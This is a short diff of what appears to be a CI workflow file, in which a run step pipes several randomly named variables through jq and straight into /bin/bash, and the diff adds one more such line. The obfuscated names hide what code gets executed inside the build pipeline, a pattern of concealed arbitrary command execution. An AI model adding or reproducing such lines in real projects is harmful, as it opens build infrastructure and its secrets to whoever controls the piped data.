@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$sr1838" | jq -r .m140 | /bin/bash
           printf '%s' "$iuv3" | jq -r .aqbnq11607 | /bin/bash
           echo $xku21387 | jq -r .hg1 | /bin/bash
+          printf '%s' "$z490" | jq -r .q4702 | /bin/bash
 
       - name: Store results
         if: always()
